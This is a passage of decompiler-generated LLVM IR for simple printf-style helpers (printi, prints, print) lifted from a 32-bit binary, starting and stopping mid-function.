  %v5_8048473 = and i32 %v6_804847362, -256
  %v6_8048473 = or i32 %v3_8048473, %v5_8048473
  %v4_8048475 = icmp eq i8 %v2_8048473, 0
  %v1_8048477 = icmp eq i1 %v4_8048475, false
  br i1 %v1_8048477, label %dec_label_pc_804846a, label %dec_label_pc_8048479

dec_label_pc_8048479:                             ; preds = %dec_label_pc_804846a, %dec_label_pc_804845b
  %stack_var_-12.0.lcssa = phi i32 [ 0, %dec_label_pc_804845b ], [ %v4_804846a, %dec_label_pc_804846a ]
  %v5_804847f = icmp slt i32 %stack_var_-12.0.lcssa, %arg3
  br i1 %v5_804847f, label %dec_label_pc_804848a, label %dec_label_pc_8048490

dec_label_pc_804848a:                             ; preds = %dec_label_pc_8048479
  store i32 %stack_var_-12.0.lcssa, i32* @edx, align 4
  %v5_804848d = sub i32 %arg3, %stack_var_-12.0.lcssa
  br label %dec_label_pc_8048490

dec_label_pc_8048490:                             ; preds = %dec_label_pc_8048479, %dec_label_pc_804848a
  %storemerge = phi i32 [ %v5_804848d, %dec_label_pc_804848a ], [ 0, %dec_label_pc_8048479 ]
  %v1_8048493 = and i32 %arg4, 2
  %tmp24 = mul nuw nsw i32 %v1_8048493, 8
  %tmp25 = or i32 %tmp24, 32
  br label %dec_label_pc_80484a1

dec_label_pc_80484a1:                             ; preds = %dec_label_pc_8048490, %entry
  %stack_var_12.0 = phi i32 [ %arg3, %entry ], [ %storemerge, %dec_label_pc_8048490 ]
  %stack_var_-16.0 = phi i32 [ 32, %entry ], [ %tmp25, %dec_label_pc_8048490 ]
  %v1_80484a4 = urem i32 %arg4, 2
  %v2_80484a4 = icmp eq i32 %v1_80484a4, 0
  %v1_80484a9 = icmp eq i1 %v2_80484a4, false
  %.pre9 = inttoptr i32 %arg1 to i32*
  br i1 %v1_80484a9, label %dec_label_pc_80484eb.preheader, label %dec_label_pc_80484c4.preheader

dec_label_pc_80484c4.preheader:                   ; preds = %dec_label_pc_80484a1
  %tmp2647 = icmp slt i32 %stack_var_12.0, 1
  %tmp2748 = icmp eq i1 %tmp2647, false
  br i1 %tmp2748, label %dec_label_pc_80484ad.lr.ph, label %dec_label_pc_80484eb.preheader

dec_label_pc_80484ad.lr.ph:                       ; preds = %dec_label_pc_80484c4.preheader
  br label %dec_label_pc_80484ad

dec_label_pc_80484ad:                             ; preds = %dec_label_pc_80484ad.lr.ph, %dec_label_pc_80484ad
  %stack_var_-20.050 = phi i32 [ 0, %dec_label_pc_80484ad.lr.ph ], [ %v4_80484be, %dec_label_pc_80484ad ]
  %stack_var_12.149 = phi i32 [ %stack_var_12.0, %dec_label_pc_80484ad.lr.ph ], [ %v4_80484c1, %dec_label_pc_80484ad ]
  %v3_80484b6 = call i32 @printchar(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_80484be = add i32 %stack_var_-20.050, 1
  %v4_80484c1 = add i32 %stack_var_12.149, -1
  %tmp26 = icmp slt i32 %v4_80484c1, 1
  %tmp27 = icmp eq i1 %tmp26, false
  br i1 %tmp27, label %dec_label_pc_80484ad, label %dec_label_pc_80484eb.preheader

dec_label_pc_80484eb.preheader:                   ; preds = %dec_label_pc_80484c4.preheader, %dec_label_pc_80484ad, %dec_label_pc_80484a1
  %stack_var_12.2.ph = phi i32 [ %stack_var_12.0, %dec_label_pc_80484a1 ], [ %stack_var_12.0, %dec_label_pc_80484c4.preheader ], [ %v4_80484c1, %dec_label_pc_80484ad ]
  %stack_var_-20.1.ph = phi i32 [ 0, %dec_label_pc_80484a1 ], [ 0, %dec_label_pc_80484c4.preheader ], [ %v4_80484be, %dec_label_pc_80484ad ]
  %v2_80484ee36 = load i8, i8* %arg2, align 1
  %v4_80484f040 = icmp eq i8 %v2_80484ee36, 0
  %v1_80484f241 = icmp eq i1 %v4_80484f040, false
  br i1 %v1_80484f241, label %dec_label_pc_80484cc.lr.ph, label %dec_label_pc_804850d.preheader

dec_label_pc_80484cc.lr.ph:                       ; preds = %dec_label_pc_80484eb.preheader
  %v4_80484eb35 = ptrtoint i8* %arg2 to i32
  br label %dec_label_pc_80484cc

dec_label_pc_80484cc:                             ; preds = %dec_label_pc_80484cc.lr.ph, %dec_label_pc_80484cc
  %v4_80484eb44 = phi i32 [ %v4_80484eb35, %dec_label_pc_80484cc.lr.ph ], [ %v5_80484e8, %dec_label_pc_80484cc ]
  %stack_var_-20.143 = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484cc.lr.ph ], [ %v4_80484e5, %dec_label_pc_80484cc ]
  %stack_var_8.042 = phi i8* [ %arg2, %dec_label_pc_80484cc.lr.ph ], [ %v22_80484e8, %dec_label_pc_80484cc ]
  %v2_80484cf = load i8, i8* %stack_var_8.042, align 1
  %v3_80484cf = zext i8 %v2_80484cf to i32
  %v3_80484dd = call i32 @printchar(i32* %.pre9, i32 %v3_80484cf)
  %v4_80484e5 = add i32 %stack_var_-20.143, 1
  %v5_80484e8 = add i32 %v4_80484eb44, 1
  %v22_80484e8 = inttoptr i32 %v5_80484e8 to i8*
  %v2_80484ee = load i8, i8* %v22_80484e8, align 1
  %v4_80484f0 = icmp eq i8 %v2_80484ee, 0
  %v1_80484f2 = icmp eq i1 %v4_80484f0, false
  br i1 %v1_80484f2, label %dec_label_pc_80484cc, label %dec_label_pc_804850d.preheader

dec_label_pc_804850d.preheader:                   ; preds = %dec_label_pc_80484cc, %dec_label_pc_80484eb.preheader
  %stack_var_-20.1.lcssa = phi i32 [ %stack_var_-20.1.ph, %dec_label_pc_80484eb.preheader ], [ %v4_80484e5, %dec_label_pc_80484cc ]
  %tmp2831 = icmp slt i32 %stack_var_12.2.ph, 1
  %tmp2932 = icmp eq i1 %tmp2831, false
  br i1 %tmp2932, label %dec_label_pc_80484f6.lr.ph, label %dec_label_pc_8048513

dec_label_pc_80484f6.lr.ph:                       ; preds = %dec_label_pc_804850d.preheader
  br label %dec_label_pc_80484f6

dec_label_pc_80484f6:                             ; preds = %dec_label_pc_80484f6.lr.ph, %dec_label_pc_80484f6
  %stack_var_-20.234 = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_80484f6.lr.ph ], [ %v4_8048507, %dec_label_pc_80484f6 ]
  %stack_var_12.333 = phi i32 [ %stack_var_12.2.ph, %dec_label_pc_80484f6.lr.ph ], [ %v4_804850a, %dec_label_pc_80484f6 ]
  %v3_80484ff = call i32 @printchar(i32* %.pre9, i32 %stack_var_-16.0)
  %v4_8048507 = add i32 %stack_var_-20.234, 1
  %v4_804850a = add i32 %stack_var_12.333, -1
  %tmp28 = icmp slt i32 %v4_804850a, 1
  %tmp29 = icmp eq i1 %tmp28, false
  br i1 %tmp29, label %dec_label_pc_80484f6, label %dec_label_pc_8048513

dec_label_pc_8048513:                             ; preds = %dec_label_pc_80484f6, %dec_label_pc_804850d.preheader
  %stack_var_-20.2.lcssa = phi i32 [ %stack_var_-20.1.lcssa, %dec_label_pc_804850d.preheader ], [ %v4_8048507, %dec_label_pc_80484f6 ]
  ret i32 %stack_var_-20.2.lcssa

; uselistorder directives
  uselistorder i32 %v5_80484e8, { 1, 0 }
  uselistorder i32 %stack_var_-16.0, { 1, 0 }
  uselistorder i32 %stack_var_-12.0.lcssa, { 1, 2, 0 }
  uselistorder i32 %v5_804846d, { 1, 2, 0 }
  uselistorder i32 %v4_8048462, { 0, 2, 1 }
  uselistorder i32 %arg3, { 3, 1, 2, 0 }
  uselistorder i8* %arg2, { 1, 3, 2, 0, 4 }
  uselistorder label %dec_label_pc_80484f6, { 1, 0 }
  uselistorder label %dec_label_pc_80484cc, { 1, 0 }
  uselistorder label %dec_label_pc_80484eb.preheader, { 1, 0, 2 }
  uselistorder label %dec_label_pc_80484ad, { 1, 0 }
  uselistorder label %dec_label_pc_8048490, { 1, 0 }
  uselistorder label %dec_label_pc_804846a, { 1, 0 }
}

define i32 @printi(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i8*, align 4
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp31 = call i32 @__decompiler_undefined_function_0()
  %tmp32 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v5_804852f = sext i32 %tmp35 to i64
  %v4_8048532 = icmp eq i32 %tmp35, 0
  %v5_8048532 = icmp slt i32 %tmp35, 0
  %v1_8048536 = icmp eq i1 %v4_8048532, false
  br i1 %v1_8048536, label %dec_label_pc_804855d, label %dec_label_pc_8048538

dec_label_pc_8048538:                             ; preds = %entry
  store i32 48, i32* %stack_var_-16, align 4
  %tmp47 = bitcast i32* %stack_var_-16 to i8*
  %v6_804854d = call i32 @prints(i32 %arg1, i8* %tmp47, i32 %tmp31, i32 %tmp32)
  br label %dec_label_pc_8048638

dec_label_pc_804855d:                             ; preds = %entry
  %v4_804855d = icmp eq i32 %tmp28, 0
  br i1 %v4_804855d, label %dec_label_pc_804857e, label %dec_label_pc_8048563

dec_label_pc_8048563:                             ; preds = %dec_label_pc_804855d
  %v12_8048563 = icmp eq i32 %tmp27, 10
  %v1_8048567 = icmp eq i1 %v12_8048563, false
  br i1 %v1_8048567, label %dec_label_pc_804857e, label %dec_label_pc_8048569

dec_label_pc_8048569:                             ; preds = %dec_label_pc_8048563
  %v1_804856d = icmp eq i1 %v5_8048532, false
  br i1 %v1_804856d, label %dec_label_pc_804857e, label %dec_label_pc_804856f

dec_label_pc_804856f:                             ; preds = %dec_label_pc_8048569
  %v1_8048579 = sub i32 0, %tmp35
  %v5_804857b = sext i32 %v1_8048579 to i64
  br label %dec_label_pc_804857e

dec_label_pc_804857e:                             ; preds = %dec_label_pc_8048569, %dec_label_pc_8048563, %dec_label_pc_804855d, %dec_label_pc_804856f
  %stack_var_-24.0 = phi i64 [ %v5_804852f, %dec_label_pc_804855d ], [ %v5_804852f, %dec_label_pc_8048563 ], [ %v5_804852f, %dec_label_pc_8048569 ], [ %v5_804857b, %dec_label_pc_804856f ]
  %stack_var_-32.0 = phi i32 [ 0, %dec_label_pc_804855d ], [ 0, %dec_label_pc_8048563 ], [ 0, %dec_label_pc_8048569 ], [ 1, %dec_label_pc_804856f ]
  %v15_8048581 = ptrtoint i32* %stack_var_-5 to i32
  %tmp48 = bitcast i32* %stack_var_-5 to i8*
  store i8* %tmp48, i8** %stack_var_-40, align 4
  store i8 0, i8* %tmp48, align 4
  %v4_80485df7 = trunc i64 %stack_var_-24.0 to i32
  %v5_80485df8 = icmp eq i32 %v4_80485df7, 0
  %v1_80485e315 = icmp eq i1 %v5_80485df8, false
  br i1 %v1_80485e315, label %dec_label_pc_804858f.lr.ph, label %dec_label_pc_80485e5

dec_label_pc_804858f.lr.ph:                       ; preds = %dec_label_pc_804857e
  %v5_8048592 = sext i32 %tmp27 to i64
  br label %dec_label_pc_804858f

dec_label_pc_804858f:                             ; preds = %dec_label_pc_804858f.lr.ph, %dec_label_pc_80485b7
  %v3_80485b718 = phi i8* [ %tmp48, %dec_label_pc_804858f.lr.ph ], [ %v22_80485b7, %dec_label_pc_80485b7 ]
  %stack_var_-24.116 = phi i64 [ %stack_var_-24.0, %dec_label_pc_804858f.lr.ph ], [ %v5_80485dc, %dec_label_pc_80485b7 ]
  %v6_804859d = and i64 %stack_var_-24.116, 4294967295
  %v12_804859d = udiv i64 %v6_804859d, %v5_8048592
  %v13_804859d = trunc i64 %v12_804859d to i32
  %v14_804859d = urem i64 %v6_804859d, %v5_8048592
  %v5_80485a2 = trunc i64 %v14_804859d to i8
  %v7_80485a9 = icmp sgt i8 %v5_80485a2, 9
  br i1 %v7_80485a9, label %dec_label_pc_80485ab, label %dec_label_pc_80485b7

dec_label_pc_80485ab:                             ; preds = %dec_label_pc_804858f
  %tmp52 = trunc i64 %v14_804859d to i32
  %v5_80485ae = add i32 %tmp52, %tmp
  %v1_80485b1 = add i32 %v5_80485ae, 198
  %v11_80485b1 = trunc i32 %v1_80485b1 to i8
  br label %dec_label_pc_80485b7

dec_label_pc_80485b7:                             ; preds = %dec_label_pc_804858f, %dec_label_pc_80485ab
  %stack_var_-36.0 = phi i8 [ %v11_80485b1, %dec_label_pc_80485ab ], [ %v5_80485a2, %dec_label_pc_804858f ]
  %v4_80485b7 = ptrtoint i8* %v3_80485b718 to i32
  %v5_80485b7 = add i32 %v4_80485b7, -1
  %v22_80485b7 = inttoptr i32 %v5_80485b7 to i8*
  %v1_80485bd = add i8 %stack_var_-36.0, 48
  store i8 %v1_80485bd, i8* %v22_80485b7, align 1
  %v5_80485dc = sext i32 %v13_804859d to i64
  %v5_80485df = icmp eq i32 %v13_804859d, 0
  %v1_80485e3 = icmp eq i1 %v5_80485df, false
  br i1 %v1_80485e3, label %dec_label_pc_804858f, label %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge

dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge: ; preds = %dec_label_pc_80485b7
  store i8* %v22_80485b7, i8** %stack_var_-40, align 4
  br label %dec_label_pc_80485e5

dec_label_pc_80485e5:                             ; preds = %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge, %dec_label_pc_804857e
  %v3_8048622622 = phi i32 [ %v5_80485b7, %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge ], [ %v15_8048581, %dec_label_pc_804857e ]
  %v3_8048613 = phi i8* [ %v22_80485b7, %dec_label_pc_80485df.dec_label_pc_80485e5_crit_edge ], [ %tmp48, %dec_label_pc_804857e ]
  %v4_80485e5 = icmp eq i32 %stack_var_-32.0, 0
  br i1 %v4_80485e5, label %dec_label_pc_804861c, label %dec_label_pc_80485eb

dec_label_pc_80485eb:                             ; preds = %dec_label_pc_80485e5
  %v4_80485eb = icmp eq i32 %tmp31, 0
  br i1 %v4_80485eb, label %dec_label_pc_8048613, label %dec_label_pc_80485f1

dec_label_pc_80485f1:                             ; preds = %dec_label_pc_80485eb
  %v1_80485f4 = and i32 %tmp32, 2
  %v2_80485f4 = icmp eq i32 %v1_80485f4, 0
  br i1 %v2_80485f4, label %dec_label_pc_8048613, label %dec_label_pc_80485fb

dec_label_pc_80485fb:                             ; preds = %dec_label_pc_80485f1
  %v3_8048603 = inttoptr i32 %arg1 to i32*
  %v4_8048603 = call i32 @printchar(i32* %v3_8048603, i32 45)
  %v4_804860e = add i32 %tmp31, -1
  br label %dec_label_pc_804861c

dec_label_pc_8048613:                             ; preds = %dec_label_pc_80485f1, %dec_label_pc_80485eb
  %v4_8048613 = ptrtoint i8* %v3_8048613 to i32
  %v5_8048613 = add i32 %v4_8048613, -1
  %v22_8048613 = inttoptr i32 %v5_8048613 to i8*
  store i8* %v22_8048613, i8** %stack_var_-40, align 4
  store i8 45, i8* %v22_8048613, align 1
  %.phi.trans.insert = bitcast i8** %stack_var_-40 to i32*
  %v3_80486226.pre = load i32, i32* %.phi.trans.insert, align 4
  br label %dec_label_pc_804861c

dec_label_pc_804861c:                             ; preds = %dec_label_pc_80485e5, %dec_label_pc_80485fb, %dec_label_pc_8048613
  %v3_80486226 = phi i32 [ %v3_8048622622, %dec_label_pc_80485e5 ], [ %v3_80486226.pre, %dec_label_pc_8048613 ], [ %v3_8048622622, %dec_label_pc_80485fb ]
  %stack_var_20.0 = phi i32 [ %tmp31, %dec_label_pc_80485e5 ], [ %tmp31, %dec_label_pc_8048613 ], [ %v4_804860e, %dec_label_pc_80485fb ]
  %stack_var_-28.0 = phi i32 [ 0, %dec_label_pc_80485e5 ], [ 0, %dec_label_pc_8048613 ], [ 1, %dec_label_pc_80485fb ]
  %v1_8048628.cast = inttoptr i32 %v3_80486226 to i8*
  %v6_8048628 = call i32 @prints(i32 %arg1, i8* %v1_8048628.cast, i32 %stack_var_20.0, i32 %tmp32)
  %v2_8048633 = add i32 %v6_8048628, %stack_var_-28.0
  store i32 %v2_8048633, i32* @edx, align 4
  br label %dec_label_pc_8048638

dec_label_pc_8048638:                             ; preds = %dec_label_pc_8048538, %dec_label_pc_804861c
  %storemerge = phi i32 [ %v2_8048633, %dec_label_pc_804861c ], [ %v6_804854d, %dec_label_pc_8048538 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8* %v22_80485b7, { 0, 1, 3, 2 }
  uselistorder i8 %v5_80485a2, { 1, 0 }
  uselistorder i64 %v6_804859d, { 1, 0 }
  uselistorder i32 %tmp35, { 3, 1, 2, 0 }
  uselistorder i32 %tmp32, { 0, 2, 1 }
  uselistorder i32 %tmp31, { 2, 4, 1, 3, 0 }
  uselistorder i32 %tmp27, { 1, 0 }
  uselistorder i8** %stack_var_-40, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8048638, { 1, 0 }
  uselistorder label %dec_label_pc_804861c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80485b7, { 1, 0 }
  uselistorder label %dec_label_pc_804858f, { 1, 0 }
  uselistorder label %dec_label_pc_804857e, { 3, 0, 1, 2 }
}

define i32 @print(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-6 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_804863d = load i32, i32* @ebp, align 4
  store i32 %v0_804863d, i32* %stack_var_-4, align 4
  %v15_8048640 = ptrtoint i32* %stack_var_-44 to i32
  %v2_8048832 = ptrtoint i32* %stack_var_-6 to i32
  %stack_var_8.444 = inttoptr i32 %arg2 to i8*
  store i32 %arg2, i32* %eax.global-to-local, align 4
  %v2_804886845 = load i8, i8* %stack_var_8.444, align 1
  %v3_804886846 = zext i8 %v2_804886845 to i32
  %v5_804886847 = and i32 %arg2, -256
  %v6_804886848 = or i32 %v3_804886846, %v5_804886847
  store i32 %v6_804886848, i32* %eax.global-to-local, align 4
  %v4_804886a49 = icmp eq i8 %v2_804886845, 0
  %v1_804886c50 = icmp eq i1 %v4_804886a49, false
  br i1 %v1_804886c50, label %dec_label_pc_804864f, label %dec_label_pc_8048872

dec_label_pc_804864f:                             ; preds = %entry, %dec_label_pc_8048862
  %v0_8048850 = phi i32 [ %v4_804871466, %dec_label_pc_8048862 ], [ %v15_8048640, %entry ]
  %v5_804886856 = phi i32 [ %v5_8048868, %dec_label_pc_8048862 ], [ %v5_804886847, %entry ]
  %stack_var_8.455 = phi i8* [ %stack_var_8.4, %dec_label_pc_8048862 ], [ %stack_var_8.444, %entry ]
  %stack_var_-28.154 = phi i32 [ %stack_var_-28.0, %dec_label_pc_8048862 ], [ 0, %entry ]
  %stack_var_8.4.in53 = phi i32 [ %v5_8048862, %dec_label_pc_8048862 ], [ %arg2, %entry ]
  %stack_var_12.152 = phi i32 [ %stack_var_12.0, %dec_label_pc_8048862 ], [ %arg3, %entry ]
  %stack_var_-24.151 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8048862 ], [ %tmp5, %entry ]
  store i32 %stack_var_8.4.in53, i32* %eax.global-to-local, align 4
  %v2_8048652 = load i8, i8* %stack_var_8.455, align 1
  %v3_8048652 = zext i8 %v2_8048652 to i32
  %v6_8048652 = or i32 %v3_8048652, %v5_804886856
  store i32 %v6_8048652, i32* %eax.global-to-local, align 4
  %v10_8048654 = icmp eq i8 %v2_8048652, 37
  %v1_8048656 = icmp eq i1 %v10_8048654, false
  br i1 %v1_8048656, label %dec_label_pc_8048846, label %dec_label_pc_804865c

dec_label_pc_804865c:                             ; preds = %dec_label_pc_804864f
  %v5_804865c = add i32 %stack_var_8.4.in53, 1
  %v22_804865c = inttoptr i32 %v5_804865c to i8*
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_804866f = load i8, i8* %v22_804865c, align 1
  %v3_804866f = zext i8 %v2_804866f to i32
  %v5_804866f = and i32 %v5_804865c, -256
  %v6_804866f = or i32 %v3_804866f, %v5_804866f
  store i32 %v6_804866f, i32* %eax.global-to-local, align 4
  %v4_8048671 = icmp eq i8 %v2_804866f, 0
  br i1 %v4_8048671, label %dec_label_pc_8048872, label %dec_label_pc_8048679

dec_label_pc_8048679:                             ; preds = %dec_label_pc_804865c
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_804867c = load i8, i8* %v22_804865c, align 1
  %v3_804867c = zext i8 %v2_804867c to i32
  %v6_804867c = or i32 %v3_804867c, %v5_804866f
  store i32 %v6_804867c, i32* %eax.global-to-local, align 4
  %v10_804867e = icmp eq i8 %v2_804867c, 37
  br i1 %v10_804867e, label %dec_label_pc_8048846, label %dec_label_pc_8048686

dec_label_pc_8048686:                             ; preds = %dec_label_pc_8048679
  store i32 %v5_804865c, i32* %eax.global-to-local, align 4
  %v2_8048689 = load i8, i8* %v22_804865c, align 1
  %v3_8048689 = zext i8 %v2_8048689 to i32
  %v6_8048689 = or i32 %v3_8048689, %v5_804866f
  store i32 %v6_8048689, i32* %eax.global-to-local, align 4
  %v10_804868b = icmp eq i8 %v2_8048689, 45
  %v1_804868d = icmp eq i1 %v10_804868b, false
  br i1 %v1_804868d, label %dec_label_pc_80486a2.preheader, label %dec_label_pc_804868f

dec_label_pc_804868f:                             ; preds = %dec_label_pc_8048686
  %v5_804868f = add i32 %stack_var_8.4.in53, 2
  %v22_804868f = inttoptr i32 %v5_804868f to i8*
  br label %dec_label_pc_80486a2.preheader

dec_label_pc_80486a2.preheader:                   ; preds = %dec_label_pc_804868f, %dec_label_pc_8048686
  %stack_var_8.0.ph = phi i8* [ %v22_804865c, %dec_label_pc_8048686 ], [ %v22_804868f, %dec_label_pc_804868f ]
  %stack_var_-32.0.ph = phi i32 [ 0, %dec_label_pc_8048686 ], [ 1, %dec_label_pc_804868f ]
  %v4_80486a215 = ptrtoint i8* %stack_var_8.0.ph to i32
  store i32 %v4_80486a215, i32* %eax.global-to-local, align 4
  %v2_80486a516 = load i8, i8* %stack_var_8.0.ph, align 1
  %v3_80486a517 = zext i8 %v2_80486a516 to i32
  %v5_80486a518 = and i32 %v4_80486a215, -256
  %v6_80486a519 = or i32 %v3_80486a517, %v5_80486a518
  store i32 %v6_80486a519, i32* %eax.global-to-local, align 4
  %v7_80486a721 = icmp eq i8 %v2_80486a516, 48
  br i1 %v7_80486a721, label %dec_label_pc_804869b, label %dec_label_pc_80486d1.preheader

dec_label_pc_804869b:                             ; preds = %dec_label_pc_80486a2.preheader, %dec_label_pc_804869b
  %v4_80486a223 = phi i32 [ %v5_804869b, %dec_label_pc_804869b ], [ %v4_80486a215, %dec_label_pc_80486a2.preheader ]
  %stack_var_-32.022 = phi i32 [ %v4_804869e, %dec_label_pc_804869b ], [ %stack_var_-32.0.ph, %dec_label_pc_80486a2.preheader ]
  %v5_804869b = add i32 %v4_80486a223, 1
  %v22_804869b = inttoptr i32 %v5_804869b to i8*
  %v4_804869e = or i32 %stack_var_-32.022, 2
  store i32 %v5_804869b, i32* %eax.global-to-local, align 4
  %v2_80486a5 = load i8, i8* %v22_804869b, align 1
  %v3_80486a5 = zext i8 %v2_80486a5 to i32
  %v5_80486a5 = and i32 %v5_804869b, -256
  %v6_80486a5 = or i32 %v3_80486a5, %v5_80486a5
  store i32 %v6_80486a5, i32* %eax.global-to-local, align 4
  %v7_80486a7 = icmp eq i8 %v2_80486a5, 48
  br i1 %v7_80486a7, label %dec_label_pc_804869b, label %dec_label_pc_80486d1.preheader

dec_label_pc_80486d1.preheader:                   ; preds = %dec_label_pc_804869b, %dec_label_pc_80486a2.preheader
  %stack_var_-32.0.lcssa = phi i32 [ %stack_var_-32.0.ph, %dec_label_pc_80486a2.preheader ], [ %v4_804869e, %dec_label_pc_804869b ]
  %stack_var_8.0.lcssa = phi i8* [ %stack_var_8.0.ph, %dec_label_pc_80486a2.preheader ], [ %v22_804869b, %dec_label_pc_804869b ]
  %v4_80486d125 = ptrtoint i8* %stack_var_8.0.lcssa to i32
  store i32 %v4_80486d125, i32* %eax.global-to-local, align 4
  %v2_80486d426 = load i8, i8* %stack_var_8.0.lcssa, align 1
  %v3_80486d427 = zext i8 %v2_80486d426 to i32
  %v5_80486d428 = and i32 %v4_80486d125, -256
  %v6_80486d429 = or i32 %v3_80486d427, %v5_80486d428
  store i32 %v6_80486d429, i32* %eax.global-to-local, align 4
  %tmp67 = icmp ult i8 %v2_80486d426, 48
  br i1 %tmp67, label %dec_label_pc_80486e3, label %dec_label_pc_80486da

dec_label_pc_80486ad:                             ; preds = %dec_label_pc_80486da
  %v2_80486b6 = mul i32 %stack_var_-36.032, 10
  store i32 %v4_80486d134, i32* %eax.global-to-local, align 4
  %v2_80486be = load i8, i8* %stack_var_8.133, align 1
  %v3_80486be = zext i8 %v2_80486be to i32
  %v5_80486c5 = add i32 %v3_80486be, %v2_80486b6
  %v1_80486c8 = add i32 %v5_80486c5, -48
  %v5_80486ce = add i32 %v4_80486d134, 1
  %v22_80486ce = inttoptr i32 %v5_80486ce to i8*
  store i32 %v5_80486ce, i32* %eax.global-to-local, align 4
  %v2_80486d4 = load i8, i8* %v22_80486ce, align 1
  %v3_80486d4 = zext i8 %v2_80486d4 to i32
  %v5_80486d4 = and i32 %v5_80486ce, -256
  %v6_80486d4 = or i32 %v3_80486d4, %v5_80486d4
  store i32 %v6_80486d4, i32* %eax.global-to-local, align 4
  %tmp68 = icmp ult i8 %v2_80486d4, 48
  br i1 %tmp68, label %dec_label_pc_80486e3, label %dec_label_pc_80486da

dec_label_pc_80486da:                             ; preds = %dec_label_pc_80486d1.preheader, %dec_label_pc_80486ad
  %v5_80486d435 = phi i32 [ %v5_80486d4, %dec_label_pc_80486ad ], [ %v5_80486d428, %dec_label_pc_80486d1.preheader ]
  %v4_80486d134 = phi i32 [ %v5_80486ce, %dec_label_pc_80486ad ], [ %v4_80486d125, %dec_label_pc_80486d1.preheader ]
  %stack_var_8.133 = phi i8* [ %v22_80486ce, %dec_label_pc_80486ad ], [ %stack_var_8.0.lcssa, %dec_label_pc_80486d1.preheader ]
  %stack_var_-36.032 = phi i32 [ %v1_80486c8, %dec_label_pc_80486ad ], [ 0, %dec_label_pc_80486d1.preheader ]
  store i32 %v4_80486d134, i32* %eax.global-to-local, align 4
  %v2_80486dd = load i8, i8* %stack_var_8.133, align 1
  %v3_80486dd = zext i8 %v2_80486dd to i32
  %v6_80486dd = or i32 %v3_80486dd, %v5_80486d435
  store i32 %v6_80486dd, i32* %eax.global-to-local, align 4
  %tmp69 = icmp ult i8 %v2_80486dd, 58
  br i1 %tmp69, label %dec_label_pc_80486ad, label %dec_label_pc_80486e3

dec_label_pc_80486e3:                             ; preds = %dec_label_pc_80486ad, %dec_label_pc_80486da, %dec_label_pc_80486d1.preheader
  %stack_var_-36.0.lcssa = phi i32 [ 0, %dec_label_pc_80486d1.preheader ], [ %stack_var_-36.032, %dec_label_pc_80486da ], [ %v1_80486c8, %dec_label_pc_80486ad ]
  %stack_var_8.1.lcssa = phi i8* [ %stack_var_8.0.lcssa, %dec_label_pc_80486d1.preheader ], [ %stack_var_8.133, %dec_label_pc_80486da ], [ %v22_80486ce, %dec_label_pc_80486ad ]
  %v4_80486d1.lcssa = phi i32 [ %v4_80486d125, %dec_label_pc_80486d1.preheader ], [ %v4_80486d134, %dec_label_pc_80486da ], [ %v5_80486ce, %dec_label_pc_80486ad ]
  %v5_80486d4.lcssa = phi i32 [ %v5_80486d428, %dec_label_pc_80486d1.preheader ], [ %v5_80486d435, %dec_label_pc_80486da ], [ %v5_80486d4, %dec_label_pc_80486ad ]
  store i32 %v4_80486d1.lcssa, i32* %eax.global-to-local, align 4
  %v2_80486e6 = load i8, i8* %stack_var_8.1.lcssa, align 1
  %v3_80486e6 = zext i8 %v2_80486e6 to i32
  %v6_80486e6 = or i32 %v3_80486e6, %v5_80486d4.lcssa
  store i32 %v6_80486e6, i32* %eax.global-to-local, align 4
  %v10_80486e8 = icmp eq i8 %v2_80486e6, 115
  %v1_80486ea = icmp eq i1 %v10_80486e8, false
  br i1 %v1_80486ea, label %dec_label_pc_804872e, label %dec_label_pc_80486ec

dec_label_pc_80486ec:                             ; preds = %dec_label_pc_80486e3
  store i32 %stack_var_12.152, i32* @edx, align 4
  %v1_80486ef = add i32 %stack_var_12.152, 4
  store i32 %stack_var_12.152, i32* %eax.global-to-local, align 4
  %v1_80486f7 = inttoptr i32 %stack_var_12.152 to i32*
  %v2_80486f7 = load i32, i32* %v1_80486f7, align 4
  store i32 %v2_80486f7, i32* %eax.global-to-local, align 4
  %v4_80486fc = icmp eq i32 %v2_80486f7, 0
  br i1 %v4_80486fc, label %dec_label_pc_8048711, label %dec_label_pc_8048702

dec_label_pc_8048702:                             ; preds = %dec_label_pc_80486ec
  store i32 %v2_80486f7, i32* %eax.global-to-local, align 4
  %v5_8048705 = inttoptr i32 %v2_80486f7 to i8*
  br label %dec_label_pc_8048711

dec_label_pc_8048711:                             ; preds = %dec_label_pc_80486ec, %dec_label_pc_8048702
  %storemerge = phi i8* [ %v5_8048705, %dec_label_pc_8048702 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8052542.18, i32 0, i32 0), %dec_label_pc_80486ec ]
  %v4_8048711 = ptrtoint i8* %storemerge to i32
  store i32 %v4_8048711, i32* %eax.global-to-local, align 4
  %v5_8048714 = add i32 %v0_8048850, -4
  %v6_8048714 = inttoptr i32 %v5_8048714 to i32*
  store i32 %stack_var_-32.0.lcssa, i32* %v6_8048714, align 4
  %v5_8048717 = add i32 %v0_8048850, -8
  %v6_8048717 = inttoptr i32 %v5_8048717 to i32*
